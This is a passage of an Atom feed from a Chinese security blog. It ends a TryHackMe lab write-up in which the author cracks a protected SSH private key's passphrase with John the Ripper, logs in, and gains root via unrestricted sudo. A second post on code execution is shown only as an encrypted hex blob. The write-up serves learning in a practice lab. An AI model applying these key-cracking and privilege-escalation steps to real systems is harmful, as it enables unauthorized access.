来转换哈希并将“id_rsa”文件内容作为文本文件复制并保存到我们的计算机，我们必须将文本文件转换为哈希格式你可以使用如图所示的命令在下图中</p><p><img src="../images/image-20230521172330697.png" alt="image-20230521172330697"></p><p>直接使用.ssh里的id_rsa是登不上去的，得需要john进行破解密码</p><p><img src="../images/image-20230521173041417.png" alt="image-20230521173041417"></p><p>这里是因为使用id_rsa受到密码保护，得输入密码才能使用，所以这里就得需要john进行密码的破解</p><p><strong>john的用法就是把需要破解的东西先转为它能识别的样子，然后在进行破解</strong></p><p>最后爆破出来的密码是<code>beeswax</code></p><p><img src="../images/image-20230521173425039.png" alt="image-20230521173425039"></p><p>成功进行登录</p><p><img src="../images/image-20230521173631270.png" alt="image-20230521173631270"></p><p>然后使用sudo -l来进行查看，发现kay用户可以访问所有的sudo命令</p><p><code>sudo su</code>进行提权</p><p><img src="../images/image-20230521173743387.png" alt="image-20230521173743387"></p><p><strong>总结</strong></p><p><strong>这里的学习到了遇到smb协议的时候该怎么办</strong></p><p><strong>还有使用john来破解id_rsa的使用密码</strong></p><p><strong>感觉john是不是啥密码都能进行爆破</strong> </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;写这篇文章主要是为了记录一下学习，这个靶机里有好几个知识点是之前没学过的，然后就学习记录一下&lt;/p&gt;
&lt;p&gt;老样子还是先扫一下端口&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230521164057332.png&quot; alt=&quot;image-2023</summary>
      
    
    
    
    
    <category term="thm-Basic Pentesting" scheme="https://ke1nys.github.io/tags/thm-Basic-Pentesting/"/>
    
  </entry>
  
  <entry>
    <title>show-代码执行</title>
    <link href="https://ke1nys.github.io/posts/2e4c90e3.html"/>
    <id>https://ke1nys.github.io/posts/2e4c90e3.html</id>
    <published>2023-05-20T13:06:08.000Z</published>
    <updated>2023-05-23T07:50:31.825Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="afd8626805df0a076cc1561e36377044514cd3054efa72ff9b16cd6df3a825e4">1a90164da2a38547586d85c848ea23234cf9ef63a8ceedbc151c794cde2931a411a4dce0576ca6954eba4da492de19556ccfbf8c6a490a36646c6b679f0a571674c1ae66cf5f4f4f76cc2548b90048457eb120e87505a7de97e5aa22101535ae33e87841b264c96c733f07e217dcbdf83a4019d501fc95cfa26f660dbce2f3ea3417c0fa812ead3aabad118fd46e05cf233be8b75092f68567d6147f3fe15f987ad5a92713f7ffeb85d555c670394aa405ecce6e20221eb344aa97818491f193a11e8b3115d6ea673bdc46a635dbd17e24944f748cbd4e0ec33e6e9194a721c04739fd08b059de28ee3a2d69d5cb1f8f4c1d29184d75f70a4b6c23de6cdcdc4ed73f72b940e9b46878dc3e155dad742a1d48caab05450d96472568c317abd6df589ef8f898e6adc49148eb9a3bfc371f2420c69e5d07bdbf181a4ba399c118ab7076a086176d7292c5c35d5da4c357687739adfc5469a01477211f3b435f6bc1590e4dad53f8fcf264979adf63af6451b218f4fbffcad11d1d67537e0c288d467d5298d6a3dbd6d8657cb8fd4ad7e47427279f1fe2f32b88440ceb8df981d5cd3309d61116f7d2b8eb0000cf42488b8607f9bee1a1059a8807f92633a4d950c138cf01f8b5702877127c542f8fc16b2ff53b03ec23ff1347198017fd26c5104c9f2b41e2444ab14687b511667317442f17e615a9cfe63b7230eb76189e24bbdc21876cc303d3993476c05cce4a5a43e8e65d2cf9c17d60a5f628988d2a665ae4d5c5a56f31931da8063e06a7a7d9138be59fb81db6ed67c6bea10c2c0b51ec8de732037fd8fef1874f332ff7ac0d760cc1cb1f79175c1adfcd40c9a3aa6f84bca88e092a47ee69cec5a62e2308e4f9d4b8489dd56ec02eeef8a930548ce240fa6889a1bd1c5ce7e5fc9093eb8ad2b36a1232bc7ba21de8b24ae47e0ce3de902d12ad282a8d002fe0f199b2a939fedad480b452719bef272a7fcde2ec031ab4373be3f2b6a2ea327ea22ab950dc77fba6fd70170b4782c0eb2b2ff7c388b730778fbf276ec53119fd9ec0ed0fe3061ce503e5a69952439fa05b04e8699f1ce9621e1eaa51939a499e9230f0253b295eae9038ca3000e00d856d0ba72d1b02c2ddb28119c60dcd2374f8b5b9bdbe8e5c982e015a0315f28f45485a16eb1459bc47603279b4f5488cd7b299d720a41d9ca4b51abca9228a2ef6161b5323faa6fa010a19eb2e645f86901955109bbeba18566bfddac229747f1b09fd37ee203eed6f6ae9a2b1f002c0c267f4be642eb4e293e83119eba7b03a3c075b598f830cfecc3194d443c47b6db7803c8f1d61aad49e33c80f897d85b55971ecbda163188be96440734e5589234a5dedcb95d15f4b77262ee0fe94530250f7e45ee66eef15a2e7cf7b1fd75362b0a0f54a83e6c92c196c39d92c909ab92b3a55729f853b91644c606fb83e9c6f645898f2e0852d74bb300bd69e58d7d287ec0d99e4078394d3d99924448ca1045755e69d62cfdfb46a643193ef84a5999ead6265556a1ff551e1483981e3c6c947d9bac94ab8f2e378b23bea741175923143d3700154a72dece51e85b438408b4883f1fbcd28c9264d3a03f32ce05dab3701e75fe88f8a7181e25f2a481fa5e788b01c771c4f4010aa295e8856087469174aa3338eb7bcef990becfd2084b7025cdf6f2503c9d4ccd820f7591ad68802f820a9b1ce3d7da9bd3def5bd900bfd3b6af48451e5dc032af69a474e356ff1f3f6b753e28259d853a008d42256751e5e1e56f1d746cb8855602050bdbeda7f44b835f93de3cf3bbe8a65ca236ccca45fa67c81bc62b6eefaab2e4cade0ab9c99f8f73ecd61cf04bbdea4fa5fdd9451f20578dd64bf328e9ec641b8ced4759c9413b4ad288e6d820d9e3034d85e0178ef61c510a398b7cd10ba44b268d743201ce542a4ba74c993512df47719aa67939a013c3e9bbb5569bf2e75bcf166143e16e7335568608f116a2f5f85d1bbd3a24d460238816e1c8bac8bdf4ac424a8aad31f497215083f97f9544777904605d6a8ff76ddbb535dfa263560e2431eaf4c78518d905ea64173ef231fcfae72ab26f112ebef50a0002a05771f230c863cba3b6c89499ce586348f7a5daa1f64adac0d55319f671863bdb3e9e0dafa653742f16b35413963290fe0eae627c0ccaa25d6b34a837de43945fc0f7613526e2ba382b9ad41b8736278b002f9d03ea028bdc9277b4839938543ee3e3bda42fa6f7de7108a5cedff4ae6a942c9c2b3c4eb18237e7d46588ea38c19a1437b37500e376eb1932e268f39a9a225be3ec7455993ddcdc1fbbe9fdc2b2d93578997e23d4b716f0b5ec27ccac9aae87c6b7a08e3d0e6eec37f7f2bc582966b170b8fa8063c223cbac269707c6711295e2b12069c9deef79350689e70ce94e936a6dba8581c74bccba24324ecac8054e47964bd64c21073360892ee2f9d6d0eb63b314965a78aa6cfd2a2328391079bfacf14566f7f66c02211c8dd6aae84a516b000fe23fad18f44828591090dc4470fc6b8d0e2b245a0a3513bdfbff7e54c6fe7be396c38c6f1b84f0758318ca12c69a7a3659bab785fa6d18f6eb1cf67d44b0c69a90f3608e23fac866922518d96284e9ec465c1640f9dcae60a57a54800a99c370e512a21c5362326874717e7097ea2f771c4279206f3822bcd330a50cb16a225de1512790baf6e3ad4b98c91d4c8bd3aaf8f44ba84453eed1c7efee23605770aee881a667ff7efaeef179c4949abe083c25e7d6246c176bb8a733310fa57ee5e43073f2a4ffc4717aa0b4552dd74e2a0fc8bf5947b18716fe383490e2f78e795638be404c115508c02dc9ef5870771665213e7df7504bc9f60fb14df0b986975085d21442002c2b7df9f0efabec2422e0a2d2b9497409addb0d8f6135da697cf66effd4a6658f03d4ea4cbde9074494d729d4da363187d597759c34f5d7a5b08b1582ad5640ed8b402f7d6f21be2e6abac1603bc63f499e5b0ba67586e2682863852a8ed189281b422960a164a52bd5bfd0125c7af42e37566bb931825cee3f5240415811b1f498694fb3d15a33c48acd0882c50d8564a5f7230cb79adbbdfae4ef4258aa7c1ccc0fdba846631834677f1bd659122eb949ef2a3c317ac65c1a487489dc5530033a3b2d3352ddf46faab4152e3e03201ed0df1488a63d11dac86326d327631dd66c1e65f45bb918c39ba665d22f90afab91dd5893f4b7ca8e8268106b59c599b41d5aa0e1166125249c2496ea07bb0edc0daf88728be7f409f7d95399cc9a0559f1edf51fa90b7175a406773890a9f5007bd1c3ef5d22acac240d2f5da18753d044121bb3f4ffb035cbd3af6d04826a78624a08dc0927d55f10d9402833a20f07c2f51f264d44c6554af57a2b37fead41bc70eb2f5efa8f5c1c2ee144307eae7cf296c4fdab9555dc9395d8d197eb618f7098d528e681cc0b827ff58138229e95e7f3e446b6e255d7636b5a9c7c28f85339e80d4f4769a294c7091cfe772214267060aa1c8aa40e337c6f609ccb89eb95c90d8aefe6fb21844084d1cfb645d9e5b620f0acd8b682938ace2862bbf5ec6dbd715f91cf7a9631f47c69f767f85e21d088e1d166cc73666fd57b03e117e68438ece000580f905fd3e0bc6feefac1a696e6a5efea0af69e434aab38ea797e396801e74e0cf4ec78c9a8dbf993dca0825e703b0bb01244a67ce2001ea6675f1f6e30b723b8bc96f8e7844fc737dfa211ff4ea7d0c07bdf568ad71e39cbcf4830aa9419605a77308078a1284662da20d98d648338ae9ed5d542c28c17f54a71a97fa6a8efd7d128f15c6f06edf7a78c4de08ef90b383d5024ad10bceeed9a7e915ed70d17e6ef9bb90adfe8e26d2d8565258fe1b1f6153b7d68d42b43a1b7b141b0e7c9d1a907edb45c0022e8b6e8fdfa1ccb96b8959a62c1e75c0204c069f84476991c8c7c49d5dd2709d235cdc5f6df59af4a0140f6ed74ecb7282a55e9f9f8bfec0963746c39db33705172136d8c7463c3c11ca1882d3000e14e0aa3b003b258f4100f2074c77de4cf127eb1dc9cf2b773ce5ed9145308ca26eda87476df07da15b757b65725ad9e8d8f799dded718612d8ae35eb4a5372c090df442af1908edc7fcdb8506273f8db95c74f413fc0b08de89f1271be70deeeb6a1a46d6d5a20e54d5ecd460f49236b2b4eea41766539b7e3b618561b5f5923fd9b8d679a3cd1da3f23975166e220fa1816fdadb7b14cccfcd1b7394c8e8d06194e2f4e8056c836525c311c5798005aa6a58c1cfbf8477808b8ea9c3821de2dff05b148270487dbd1dcdaad7baa5ba0c3b9cb1699331aefabe65b676007aa48e39f3bc9600e4d843254ead629c7862b14e8e0794d9ae546479d3344c13601f6a51a72e8f0b02486a798203df7581eb79430279aadeafa1ab9fd526734483cdac3eba256f9b937af582656b09e25b14a7c305e3f325b19299e70e3a4002bd9fd036c23963b6e434a3cebaac68da140a1c5ce6bfd0463c041996412ee30517819412ffae435e463e71a53dd359518e4e63fcac44916fdbc7ce8e23a33a23cb3890c63dbed370cfee019446450c489d7e8a4ab0c0db2488af38cd028b9ac0566b9047135f5405f6228a31ae3ea19c929fe1806826d93a6e7c30c5c41cc4976a07cc0eb6220ae851ed2a0fb4ecc913bdccac3318da0ed2dd839d8ab20d0a5d668108d8c46749ac89cbdcf62ef0c76adff2429ef32eabd4fd4e3272f53181e8d1c0fa104e03c62232912a0913397d58d87ee227bc026c00b8e92b9bf1e6f17d51421558df503f382c4998c3da12a53f4ac275854474f953a34041c33a0c531f183c36d4c24aafece19480ae1d475399eba55b9275800711743e32e8035d7f7b57ef2066fbf25825d0cca20dfc73343c24d0ae614ab8a097efa7abc282f261c502955dfbe243dc4d6eecc36eb369f7444f3c435160a9b298b84a644339d418138b81ae91a2710d53f0c6dddd74a099e6827acd9f4b46b5539e439d1f48d66d2b735286e4f02bd1780b792c50d7acfa5aebe1a93d004a2ca4478736348f1209044861b23759c21d97491cf94063ff1b9d19ed2576f126e1cb4b0690919a554a61c5381448a0e8b502c2e3aa2567b2fbb396376ae1c344d5ab68af7542f02dfdb7906e1fc30b7889a8d77faf1a31a488392a1df3c546c31837a035c328f02ea317dd9c0bf0ebe1366fe447e23e76cda4eab2541150e16a0b47af4f331f77e6caece3d9067031ced4830f24e54f0968d4777aa31b94cc6aa4e89fee0b63440eb81a905268951cb8af8f85e3a9af96f9c1b12eca46843e6f8ac1cacb46bb1b07480ed2087c9af91833d324868ca18015feeaf43ea88b1ec85f1c009bae11b314b6830ca4aebad998f0ba6f5abc2c514f2d83053be9140f8895d822b365ace72f36016e1a6ae4889f8f135979e86dc261d2c9692c07ae7d53e68c76eaf7b3243f1598756454b20aa77438ff6b69c89141bcaa96aef334e53457d0c8f943f8ffb139a5b4d02342255a642b777aa549505333afe863e90f08a4d59022936e59b28ad32c6b1256513dbefc8e6dd3556a0754cb24e1028e33d5287111918a2aeb5701e73fb28e6242bb287da0a176151bbcd527c26ac26005432e384993e2ad16e39b56417c6500eff411b880cc3daee77d4c8b0857c197169e77427ba542075f839c5823b0992356a6d9685e798b2233e282082fa2264da8a6603f093662ee5c0fc6cfbba7b30d5eab89a24d84aba20f991d5b45e44df20d4de6fe6eae6819b10599b778a0d1d9f07c26bfb2ac53ddd21965154e91b3dbae2d16ac7147a965637c7339a834b0a69c83a6c3671b2d72fa92065ca0de2f68dadb591ce24ce6eec9536a96317e31e84a783f4ef593c75674017d7b3c52f18aa8ddba91dbb626b4d3f49a9cd7fcba74f0cd773a625aa2b722ed64f9467c88ba290f8fea004135627a465e28c51566b23dc984f483bf0225b629e6977499580b8b4979ce5ea577febfd78ddd419b6dc66913dec41cd6329d5847d92e94fb18c060efb8ee1ceb605010996350d523d3039410da7aeadcafc7a578e8692ef2473d1ca4ede18d668e94061cca16298be600d4732174943e3d0f6d35afc34e5d53beaed5f05978044e4d001d48140c304860a7a893c06d0e4a288030834e378177ec17fe631821eaea74340ce88db25db35d67173e1a2ccc3a480cb89297a56b0bb6286815bcff2c88382157f7d56105f616979e3accd6c18a1effa6bf27a0728ab0093f88924473be9b85ee266220c24171f8127ffd803d241a35c69921c3e1672904d79ad101bf85b907b2eb6be72e1dea6274dc139d68e3eafdbe793b4e144e909ce9d642d57e3bd0499199bbad9881cd299647a9413252925e68a040dd3a62c387ec25d4c0211a223841cf27c95c2a276903414ae473549cb1aafb5ddf9a7703b3639cca891dd138596c3e0d20c1523f6e6db046e418574df982aff40c6ec9f1d8ca14741c3def4c0b6dcf0f0b3eff64e6b5bc85a1d0f8fd1513ba817007916a07b8249cfd577804b7f7813d6008d44acda241fb011b7170687e5d345c0fd04592e46bb7763488a046d1dcf66f4ba971e11903b709443d798ab41535126d257f3c2a168b8d8fc89b6045b31787371e67bf46729bda366237fc09fa689c3117a9dae83664d3817d146da65214d3ad25b16bddcc20f4bd2cfecbbfa41ddc95302de786426a9fb2267b7f38f5960d97e5c6343cf9e3b840f6828e8be6bf0f45678787602ff561701c2869e6555037ff907bca26b90ef77753be4118bfd7af1474d935ab4a05d8682df7a2009d5b5045cc201f64cec47534d183362f41ce221afdfe9c335b42622186e32d6ae8a7f4a75ad304ad850be165280022c79cd923879246c1943f40caa0d6c81046922612f38d2d96e52ce245b22b92ab335a063dd9c1d64741e4f7bd0eb22c3b01feac6b8786fc84760508c0064caddef24eae477d451fdcb7746d963f6f4a43011280ce97231cf253d3bcf5bd0fade2c087557c4701ad7a8ab7383b26cedd3327d96d55a8c3960406e2d495cf661cc5ecf276ad38ed5105b14bc13906d24e1484f24eaa9cd30eae2645e132e85f5cb41ca090d8bc887e36358a736ba0879eadce5902e5cc00aa72d5431a75f12b35336df50f6e8137b2f1b733b89d105e5fd139454eba8366910ae7c31a164e71a77274b15b246161cf589fc9e4557d642a19438e2e7e3a25f95c8c600c3b2c2c81335f714dbebafd7be82c728294743854d284e436b82b3a6cb3a5b0ff1692d82396d9ff7bf742adfa331ee8fd4b8e0082366501b22deb3350994644dea748577eaba00c46c9f691341d3deb95ee1d0d00fc0700b4dc52cfe75093ea9314d8fea50993e8c9cb7fb387f28824870bd22905c7592a45290743916bf37c57e3fd253471e17523978551b1490f0e89e7c16d91d6ba8cbd9673ea131143bf2766df95185a255c71c40c559c3e8c217d702c5457b2b5f9d48c9a614f4ff4214d7b97a7632aa67912786b2c8d1be31ae246434c3eb69b04960dcb69657cc5e998b48df6f36d0fac9d2b86775fe112c8a0857961ee1d3e26a0b4563452046bdbc93dff30d553b0d0019a2e3d5bb0d398deff2d62d5118287e9b4ba5e0db88e55bc941f02469a7f73b6412f73da9dae699a6a314445d220731bbd3ec77d89ce0244841944a53b41cfb0e50f8e59785c61e0a629286f1db112bdd4a22a654afc4176894382269390a50edeb05f8113b17d71ff873139fc3b4c158d71d3cb3067f6d81eb151acb8ee4f4ebb28ecaf0bea0732e6075cb4b384fce36caae6a9e40285d148e084962d388cc1c793aeed2ca58119765eb69125bdb926212413a1aaa153b3bec86fb3d3ac073d24648e59a89c2af3304fc8e78dc5e8928fdfcc4ba621c3f541afd836c60dd3412d346095ea9987e783120a652c2ecdf65fbb278f26646f7d094f1fadf69233b2b6f394fc3e7b203e7ace07edd5fbd3eed5a301f2c17ee0de1f55a5f20335e66ffce6c83aa899ee6b0eb1576e24d9ece0ff6ca2f20143bacd8cc096ab77694d737b7bd0aaae9ab71c5b484963ea8ca0f6c83d8a20c44c00b20c15ecfcda53cdad6c155d49e822965a36a2f03f9d2ccd5d0b236b5ccd65ac6aa45612ba9b0f75ccd8c77f3b090a2af7ea090c0bdced719296279a35c14f95aff113af96aa3857f690cc2717f4ba9d8064326ebbf251115c7a9f6e7ca69aa1ffd787373800383426878ffed02cc10a181f8d111e74113ff4142482f2d2e37ec0b64fe82786485e3aa35731f7f0b1e6ad16cc45cf0bb8488eb61264d53fc906524bfce6ba7b8084095d8ccbb146e58a8a8b6e422e81ed6d672756372f12673a56ad393bb42e2ab2c0b41697eaf642a3a84bafb1abadfbe0c916883bb30f39effb08bf51d193827f6bff8b3d5ce0e0aa8c4b9351d426e0c7993023397415b7e8f99e605ae7db433e50c496a2e63b0927a9f4ee9541a47dec7abf8878cd9dcdc512b432626e7797ae019b8737735497c0b5b482baefcda69f649e5236e34ad81e5190b14f05e1b9464f8aad69cac0dca9f1c273b97129d444a36e8b41c7ca6205c8615dcc72025b666dd7d471b2d6b0936eecba68ff228bff70857639f1786e0876d638f42edc3d76727599cb828117a4fd6c66867d4024d151fa04e499a8b78805f46a5df9f85a4dc7d162ac6ab0f6a9ef7c350a1988fa0bb3fa98ffcbed6f5659c44ecdb2edd3122d8d1d00d3c4f655f9ef0326b4182b0ad7d322d2884377dca159ba21d2136ea4ae52af63bf82c3d386b55a136db9e59458bcf5917fe25abbba412f3002a5b9e1b3eba4d6dfd32b49720dcd19f8d15c5e25680de7573551a92dfdafd648399988f0a81c71e5723110abf38e5255a880ec21479530d9c214ee8deb89e084a6c28ab72e161a77699aabb0a093e08d754e37ef0ba9675d7d8310e39d238bb2a53fe6f8b07104a5b2c66194a0acf1a3cd8de8e562fdf2df4972a5672dbe864f55cb7eee2f8e71167593895d5514abcbefb0f0544c0ac098f77068fd6c6772c3cf574b2d38039b5051a3f6d4fefab91fbcffbf13526486e8bbcc1723fae9ab2078b9242e1f72afd3c1ef9cae3f99b84e2ab041e802708fc61efc64b6e95638aec76cfcc76457a07e1017e516973f7bbfce2c38f4dc5faad8833fbae31edd266d70a1c93faee49dc70f1a17c4f632fc47959ba2b1e386cb6a8b86c5988334dd3a3a713c0adab1111c6c06892d45be5d354bac11688855cf6e7941392d352a83b5081f7f82fb0a2e7f8817d589a9d64a49b4eae1404c6c4582039c3502a3ef76640de4457f35af92b76249f03b81db94f147f3b6c7fe076b60d63f11c85736528f3ee44b402fba057eaf8a0b1e7c93e0e6b466c39669b368066994979437414c114348dd8de8265c8ee49d3344fcb7b3871090b5cc262f4fe83bb2f5ff2f71e02451e99c711026d6c2771246bad8c870a5481c01bf82f103dd0292129a43535a28cf0d60bf6cc360da4d4988aa4000b40ae2d574b6dc5b487cb34e8f0814b78836595388cf91120121ca1f4e00c36897c017b7c9de4611e1ee6f0ab5620860fbb607025c43c9183049b55dc758cba9fe8ca98b7a806bda12f523f876df78a9850a2ff6b45d42dfe61b3f4c584d64aaaa63f0bf65d2ae600e7b8a149a5b62d5fb43e5884e41e0955d338064bf47fc0be3bf15359d5d8df1bcce57f97855d76286f4573a29c728b08e3c858f70b323166be217e06c09835e446f198b207c07bc8b521bdf9f90e9245d12bf4cf1d231d459f2758ec71461bd301ffc30c43bb997a5e94bfc1c045c1b216c39f70c5a9efabfdc3f1ddf1ccb850f3c93f8c72b78fff7639f3017e3e05c5fcb307a6ffe6810d075b986dcb1d046daa6ad976b0770d46de2ed43cab6b727df3797eaa35e13293476d966543fb0591c5933aed16ee2d2359e756f288c0c1f3c50fd81c7302a6babcc83ee1ca6ba53e57f2e1868f2fd7cf7be54cae604afe336533aac4a904a3bc6177d5369bf3c28394694d14151250804525cb17f2487d15ac0fb83e9c04017887fde776946dfe61d59ae1527f2e0b140736344c0b058f1ebc3b4d427de98253247a1965c703366c404b851f2e2265ecae0f7af55e6aea363ae8defd9d87453969a81c1dac53c2bc7c45edc2bf3c5f0c706457cdd5f10b98d4d1e1ae0d6d4aedb6239b56cd06e16d220fdd38e5577f8be666239369b49090dafb01dbf2aed5d6229160b2e29d00910861860ee91c6dcafafea2295da9a842117dc7ee3a780c5c408f3251be5123fb5ec841b95dad3dd1cefd4834df35124c4c9c1975eae5ceb839592c6aae4ec63ccc5ea5e5fbd41462bb21a03e4b8c58210ab82a367834cb12b7b77388897120148e9412c823babd3006e9d681217cacf123b10f5d38257d064d0ad203e733e2d57c7a41fed9f63877cbe929f6592ddf1ab1b14974da1b5015996f38812925a86aecf721d1c6bbfe316e0c2c096f7991bd95e1314fd1b141b68a7f6c1ea91c4f907c6b649ee975ffb82bcfbdd3797552f41975cb146d68eb3cf2844da4945aa7493441ce9312da6bb7a6036eb23416f5d3daa370bf05c73b73f872f5d6b59971ed72f9ebf0a45eee5eee607053e06a39e573804e65d06ddeb809667d0eb78d74cb80213841bd9b028ea6e78831f27e7b4ddab3eb90a71127f71196888104e13cbc44a63534f957ae0305f198f75f672ee37203d7acdacfb7e76c27c699611d0b8d29d183ab5a25088a01fabd9bf303dd6830a000f1268ad934e8231c72f03cbf67a923087c58c0c47fbeb04d8864a936e0e6591d170556aeaaf9aa5b72b24cca1b65d10f49e9ef527f131ff09ecc795558cfcb675edb720d02739c566f11e2ba3b928f02752c3f9aa919819c0940ee33484ae459aebfa5be49497e05392934a34741c1ac85a88b30b700c34db6b223c63c69eefc5b07a8503282f0375a4f662984e31c691a0263f04044e6da21a958d6629a1c463c0b9cc4339f3f4b35a337569c3fc35dc1cefb161c72fe4055b3a43e71f2296cf939ac6fddeee0cbe06fcdf3163ed5b02811c3e53843eecb127164b5d7739958210e8c948eced5b153311436f50469653dc01861dae2d13437c0f150e09b7e2d40eee9df390834c7649b815e98853e6b69e0c39b7645c093e181be89509970595f852d5534799cfa3f01af98e513a65235308cd4c504f1b2903bf34c183f6f9ee468f879653228035049ba397a5751cf283bdf06cb3c3af82622bce16c3964906510a0c0aff71bb37649728c4857d4a459776531f50dc394837fb9214baaa86dc96e4eb88f62d751e03be717007bd83617f18c64aadd4ffce2a75d691f5e69e2763e83bc826e3331d79563210d636b0ca1b55394d4e377435160bb04dc89fe6a2b8de80a5b53d2613f71ff6cbf3fdbb0eaa320727fd6a2f3db086774a53869306364575049fb0ea3474db240626b176b794a290e6cd2cb4d1db527a7c76224de68d49ec2e7a37ee5beeca07283b3838f18a6af9ef8ef4cb1686e0c734fafbeecd234ac0cf377a20d0bfd96ffdb23db9efbcf6381e4bf4fd84e827a7b0ff95fe733fb58f44d50e9d99865b98bf1f7ae21986018ddb623594494807e7dd7b3e1b356dba127707b2b5b83be4ab13b1145318dda7b2263a6c065a9b5a2ee67f8b36bb90ddef02829406bae5ee69e909e41ae773ea33f78e7a55bf969431f1188826516c6a467c1cc9d250266006e0168ff4e5a310fb609b1478d9fdd43c803ec3aaf3466aca18e4ddea54cc95001703c570d957f0655fe7bc39ed81959aad2692e1f4d8fa9207277598700abf98657afbf6895f8b6bf0bc356b573f5926783c72ce293a70eff5c566bb9a0320baf8ec7bddaba37f5a474505c29cb344eac42d1c4aa8075b63c535affc950260132f511472ed8df15b6a3ed7283e0dc5dd0dd704410a574c9bc796ba234b1e9ac2c5db1ff447b069c20e2d9f6e2990906ad19ee510a3da5ec7f560f67ddad0a99a2d966f984f0cf9822a7be9d65b32b55fbf0967cfc2ede0b398a1b10dc33ba5a1421db8b02abdb85fd53d67b71b6a960fea59e7e1c56e74f2ea6d0a6dcdd547ede4f69a54bb8cbec60a4dc0ebcef54efafe747c293e46f3bbae7851c7e3ca1511d93d18a72a2385095aec7524aec2553ff0fe3ebfd60112ef606eb297faf963972527301e7eb5476e70c369100aebb438de318fd12ef598afda1f18f6a50bfa8c0816c541b37355938b245c66e303df2a8436d5ffabd4989cfcb031da84e7bd2131d100afed7ea690de7b7fd4b36baff4f33bfa6e9afbb77cdf6dbd6ea8d1a7fe02284a4d7467f59eaee4741f39c8a4dea7b1d50bfd3b3ebdd51e7f58a278e968ea723e25149e36683b6ed8348c934f6a43381ae7529d3b3b2914c67357e015c6c8f20ded204381ff7d4d4badc1dc37db6b08c7287999844c436066433f6fa17ea16ed5b1b34aba7cb3ec45a97fc6adefce6d2f86aa9476e44aa2aaf22ac3f9a9678069aed3154903b04a77308a273c1c0dffe191505a038f6d858ca58917b3f42b1c9d8e2b9ff2add7f742a0338ffb1c2205a297002a7f0933bedabf44d7b9dcef8f5cc03cd8592945e3d87ecf91abe4a7d15997b7c63893791e68e7e93fb1b55ec4f766c780eb8b11579e1fbe4c68462b060df1eeb5cd9336816d16f097add46382939b8a297535d1ed8605f233392739bb322ff76a6ebfa22fd3e6e9ff53c2098ed435d092f14290aa619a942dbfaebdd474958048c1feb618ef9fae0096b3f325c8d8a84d44acaa973af9c348feb3f6e9f727f21ee0cba496c03d58d9bf2fb7ceb76795589af8f677aa6d8ce3978033ac03aa5d87d54ef8776751dfa7adb3eeb8b8531d568968fb21d5e0bd3b466f7330926dfe38089b59876e0860ea2602ce73830828478d52ce72d4e7681394e3ea18b94afff0834d650760aee1791300d648c8420c2a287833fb93f077149f74f996a17210a364397d500b5b258d0b07b2584a4f55a8fb7f53276d8b2eec1f2c6dd9238f924f340ecc218029fb974f10614684c7bfa33dd0edde036db444ff9749327bd7e9c0a87b35fc98ec0cfb71fa913dba562963809d7c1973761ed4faf1aa1cd07fad0dcdbd03be5f29515b6610160b66a4f82630f6beb36ff3623fb4d7bf89e7673632619bc5e365dae2d6d9ef812f2ac8e2e1c320b41ca56f1291718c1986253d1834eb9da3d34b73da5c2703ca4a26c0752b48c27a08cd80ada9f1ce6066076adb45788a4b40009246301b37d97de1fe5123fac085bd112bb58cd2008d2933666999d0bd33aa72d158c26591a82608db967adced3736aced0b1602ca38f542e305cda70123f3bf2c6207cc58962c5b38464210426712ad101bc09afe89551ac40fbbd93957e4b314ede5e2b6537fe6268156924236f89d9d16240361326f03702903b1a82f05d869134e766b7381a8a9ad31ff8a429f26b8cdc09483db22007aa74f84d69ba788c657429be45bcd734ce674a98101bf3f3ab08668be99fda3fe2bb24bfb7bf82b203b87d69a8d106740af0bf3d115f19a04a10802d97aac2aab4e94fad7f629bfa4bd516335943baead5195372fe851cd2bf892038591912ff0348ba74da89fc2014ab3bea57183a082a61312fc57a1745cbd8dc23f748f0a72505323e2c4e95f3842b63c6fafc8e368036444e34d28c70d765c1033868d1abcb12a0ab32aacba62f3ba0a2e3c4fe7f94e286713806b2f16a59af1332789240c8ab0893ef05f00a6945dafe0660acd49b954a6e791ed3a331be17d4810f083cbcd24ed58f7ac63e1a567860de4b4cf5a7e55327adb05479c183d1d59ed819700cc4b624803b6cf79e7367f3f5dc1ebfcf037fa8afadc0858aef50de12702f9836d2c34d4cc41e938724a65bd80d76bac57cacd2f8bfe874b7da753e032ae294c51720d261ef69f15a2e8ccf26bcc8c6d8acbe8483b35d8886d5945a92385eb4cf9835113e5e2f5be5e11ff73cb5588582e9775803ada380489c8562f14b164f927b073048b883c9fc21b5966f89834ce659f65de2d245dbd9821ca8d7d40897afed391278a4a083ce592409887a8464e68677fc5f966b83f448e56d62abede7104d2a7ca27d7a1f27c0debf96547a39f7f3a22ff147376950fc3004a72defd73d04aea98255bfeabd0abc6dc17fb0d6e6fa64ddb7ec4760e35a29a215be59652fc4b67abec83c653151cf7f7a4a5609604eb76261985e511b550518192d246552e2c0d41d905a0cac7cda3bbaf85bec2ff3cacb2a57f83a167879a4f01653884eb03a727219933f3e287f734faf9bf40c94cdaebbffe50572be7e314b52423371431e47da9309a34d928b8c3b03b1bf67974ead19b067ae485c6a5ba2f14e7de0057ba155d381de38f55a44c986f37b94adbf79511e2bab22e6ede323a91c642fb5350c1844a2bc2e4cec7533d55f8c656440bb4affb4accb099106182906c85630e76a7571a85a05740aeecf27742a48cccadee334741efa77c9c5103dd00e26c2abdacf12e1a3f5658eb14417705ec4a5319a1ffd266293751950f1b9ffbdc86679d11b6ba3b676fe6f136efa06627fbed4044b2b38cb886e1f8d682a11633fad1236a4e09e5b9379da387881b641e04c6938f6f3cd155aceb5a146bd3ddd7ef827a83aa20db5f4cfe2fbfe21388270bc69525919080be396bb006552695e01badb6ba73251f4bea15cd13919d7f87791be44cb251a6f5393264187112eb8ad91177abbd4ced251fe0d9bf2109d8a3a1ada888f81cfdf824c8fdf30e98c6e5aba1a33fbda95c19a3e1361de391d9372cfb068a71bea71d0be17ac8383e7e84ef88df96767fc1cb405a77aaee0f177e29a46d0ae66020ded8a5222b7d2a8f1ba3609dd3fb18ede218d46efe920146c4f706edee75f05e8a4ad68a123c6fb31f5c33633406db6252f3a0bdbabbeafea20434c8a88ba92482fbbab2545aff12847f8307d4926657a0918d59e34e263f20b8b8ceae75c7604d39cdc88d0c236c6cec95463aa14f67a5fbff033e37eed0edf2bdd6552a9668aa3d8db66578ce657e57413558b90c0c07e424176e33352982589dae699fa03a91da2